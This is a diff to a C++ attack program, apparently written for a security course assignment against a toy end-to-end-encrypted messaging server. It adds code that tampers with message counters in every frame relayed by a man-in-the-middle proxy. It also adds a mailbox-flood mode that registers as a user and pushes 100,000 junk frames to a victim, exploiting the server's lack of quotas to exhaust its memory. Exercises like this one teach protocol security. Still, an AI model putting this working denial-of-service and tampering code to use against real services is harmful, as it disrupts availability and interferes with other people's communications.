@@ -68,6 +68,12 @@ struct Opts {
     std::string server_host = "as3_server";
     int server_port = 9000;
     long gap = 1000;  // how far ahead to push `n`; keep <= MAX_SKIP (1000) for max work
+
+    // --flood-mailbox mode (the "another implementation flaw" from the brief):
+    bool flood = false;        // if true, run mailbox flood instead of the MITM proxy
+    std::string as_user = "evil";  // username we register as (server checks `from`)
+    std::string target = "bob";    // recipient whose mailbox we fill
+    long count = 100000;           // number of junk frames to enqueue
 };
 
 std::atomic<uint64_t> g_frames_tampered{0};
@@ -129,28 +135,39 @@ int listen_on(const std::string& host, int port) {
 }
 
 // Rewrite the per-frame message number. Frames arrive as one-line JSON; the header
-// shape is {"dh":"...","pn":<int>,"n":<int>,...}. We match the `n` that follows `pn`
-// (so we never touch `pn` itself) and replace its value with current + gap. Using the
-// real `n` as a base keeps the gap under MAX_SKIP so the receiver takes the expensive
-// path rather than the cheap early `raise`.
+// shape is {"dh":"...","pn":<int>,"n":<int>,...}. A single poll response may carry
+// MANY frames in one line ({"type":"frames","frames":[frame,frame,...]}), so we must
+// rewrite EVERY frame's `n`, not just the first. We match the `n` that follows `pn`
+// (so we never touch `pn` itself) and set it to its real value + gap. Keeping the gap
+// <= MAX_SKIP makes the receiver take the expensive skip path rather than the cheap
+// early `raise`.
 std::string tamper_line(const std::string& line, long gap) {
-    // Capture: ("pn":<digits>,"n":)(<digits>)
+    // Capture per frame: ("pn":<digits>,"n":)(<digits>)
     static const std::regex re(R"(("pn":\d+,"n":)(\d+))");
-    std::smatch m;
-    if (!std::regex_search(line, m, re)) return line;  // not a frame we can tamper
+    auto begin = std::sregex_iterator(line.begin(), line.end(), re);
+    auto end = std::sregex_iterator();
+    if (begin == end) return line;  // no frame headers in this line
 
-    long real_n = 0;
-    try {
-        real_n = std::stol(m[2].str());
-    } catch (...) {
-        return line;
+    std::string out;
+    out.reserve(line.size() + 32);
+    size_t last = 0;
+    for (auto it = begin; it != end; ++it) {
+        const std::smatch& m = *it;
+        long real_n = 0;
+        try {
+            real_n = std::stol(m[2].str());
+        } catch (...) {
+            continue;
+        }
+        long new_n = real_n + gap;
+        size_t digits_pos = static_cast<size_t>(m.position(2));
+        out.append(line, last, digits_pos - last);  // text up to the digits
+        out.append(std::to_string(new_n));           // rewritten value
+        last = digits_pos + static_cast<size_t>(m.length(2));
+        g_frames_tampered.fetch_add(1, std::memory_order_relaxed);
+        std::cerr << "[mallory] tampered frame: n " << real_n << " -> " << new_n << "\n";
     }
-    long new_n = real_n + gap;
-
-    std::string out = line;
-    out.replace(m.position(2), m.length(2), std::to_string(new_n));
-    g_frames_tampered.fetch_add(1, std::memory_order_relaxed);
-    std::cerr << "[mallory] tampered frame: n " << real_n << " -> " << new_n << "\n";
+    out.append(line, last, std::string::npos);  // trailing text
     return out;
 }
 
@@ -202,6 +219,60 @@ void handle_client(int bob_fd, Opts opts) {
               << g_frames_tampered.load() << ")\n";
 }
 
+// --flood-mailbox mode: register as `as_user`, then enqueue `count` junk frames to
+// `target`. The server rejects a spoofed `from` (we observed {"err":"bad sender"}), so
+// we register first; after that there is no per-mailbox quota or rate limit, and the
+// recipient's queue — hence server memory — grows without bound. The frames carry a
+// bogus ratchet pubkey and random ciphertext; the victim rejects each cheaply on poll,
+// but the queue itself is the DoS.
+int flood_mailbox(const Opts& o) {
+    int fd = dial(o.server_host, o.server_port);
+    if (fd < 0) {
+        std::cerr << "[flood] cannot reach server " << o.server_host << ":"
+                  << o.server_port << "\n";
+        return 1;
+    }
+    // register so `from` passes the server's sender check
+    std::string reg = "{\"type\":\"register\",\"user\":\"" + o.as_user + "\"}\n";
+    if (send(fd, reg.data(), reg.size(), 0) < 0) {
+        std::cerr << "[flood] register send failed\n";
+        close(fd);
+        return 1;
+    }
+    char ack[512];
+    recv(fd, ack, sizeof(ack), 0);  // best-effort read of the register ack
+
+    // A fixed junk frame: bogus 32-byte dh (b64 of 0x11*32), 48-byte ct (b64 of zeros).
+    const std::string dh_b64 = "ERERERERERERERERERERERERERERERERERERERERERE=";  // 0x11*32
+    const std::string ct_b64 =
+        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // zeros
+    std::string frame = "{\"type\":\"send\",\"frame\":{\"from\":\"" + o.as_user +
+                        "\",\"to\":\"" + o.target +
+                        "\",\"header\":{\"dh\":\"" + dh_b64 +
+                        "\",\"pn\":0,\"n\":0},\"ct\":\"" + ct_b64 + "\"}}\n";
+
+    std::cerr << "[flood] registered as " << o.as_user << "; enqueuing " << o.count
+              << " frames to " << o.target << " ...\n";
+    char drain[65536];
+    for (long i = 0; i < o.count; ++i) {
+        if (send(fd, frame.data(), frame.size(), 0) < 0) {
+            std::cerr << "[flood] send failed after " << i << " frames\n";
+            close(fd);
+            return 1;
+        }
+        // Drain the server's per-send "ok" replies without blocking; otherwise the
+        // socket back-pressures once both buffers fill and the flood stalls.
+        if ((i & 0x3FF) == 0) {
+            while (recv(fd, drain, sizeof(drain), MSG_DONTWAIT) > 0) {
+            }
+        }
+    }
+    std::cerr << "[flood] done: " << o.count << " frames queued in " << o.target
+              << "'s mailbox (no quota / no rate limit enforced)\n";
+    close(fd);
+    return 0;
+}
+
 Opts parse_args(int argc, char** argv) {
     Opts o;
     for (int i = 1; i < argc; ++i) {
@@ -219,8 +290,22 @@ Opts parse_args(int argc, char** argv) {
             parse_hostport(next("--server"), o.server_host, o.server_port);
         } else if (a == "--gap") {
             o.gap = std::stol(next("--gap"));
+        } else if (a == "--flood-mailbox") {
+            o.flood = true;
+        } else if (a == "--as") {
+            o.as_user = next("--as");
+        } else if (a == "--target") {
+            o.target = next("--target");
+        } else if (a == "--count") {
+            o.count = std::stol(next("--count"));
         } else if (a == "-h" || a == "--help") {
-            std::cout << "usage: attack0 --listen H:P --server H:P --gap N\n";
+            std::cout
+                << "usage:\n"
+                << "  MITM counter tamper (shown to be PREVENTED by header auth):\n"
+                << "    attack0 --listen H:P --server H:P --gap N\n"
+                << "  mailbox flood (the real availability flaw):\n"
+                << "    attack0 --flood-mailbox --server H:P --as USER --target USER "
+                   "--count N\n";
             std::exit(0);
         }
     }
@@ -231,6 +316,9 @@ Opts parse_args(int argc, char** argv) {
 
 int main(int argc, char** argv) {
     Opts opts = parse_args(argc, argv);
+    if (opts.flood) {
+        return flood_mailbox(opts);
+    }
     int lfd = listen_on(opts.listen_host, opts.listen_port);
     if (lfd < 0) {
         std::cerr << "cannot listen on " << opts.listen_host << ":" << opts.listen_port
